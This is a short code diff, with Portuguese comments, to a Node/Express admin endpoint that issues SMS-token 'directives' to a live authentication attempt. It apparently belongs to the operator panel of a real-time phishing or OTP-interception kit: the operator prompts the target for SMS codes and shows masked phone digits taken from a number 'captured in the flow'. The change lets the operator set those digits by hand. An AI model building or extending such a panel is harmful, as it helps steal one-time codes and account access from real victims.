@@ -259,7 +259,12 @@ router.post("/auth-attempt/command", requireAdmin, async (req, res) => {
       existing.directive === "sms_token_retry" ||
       existing.directive === "sms_token_wait";
     updates.directive = inSms ? "sms_token_retry" : "sms_token";
-    updates.smsLast3 = last3FromSteps(existing.steps) ?? existing.smsLast3 ?? null;
+    // Os 3 dígitos vêm do modal do painel (exatamente 3 numéricos). Não é
+    // sensível: são apenas os 3 últimos exibidos como XX XXXXX-X###. Fallback ao
+    // valor já definido ou ao telefone capturado no fluxo, se o campo vier vazio.
+    const provided = str(req.body?.smsLast3, 3);
+    const last3 = provided && /^\d{3}$/.test(provided) ? provided : null;
+    updates.smsLast3 = last3 ?? existing.smsLast3 ?? last3FromSteps(existing.steps) ?? null;
     label = inSms ? "Comando: Token SMS (nova tentativa)" : "Comando: Token SMS";
   }
 
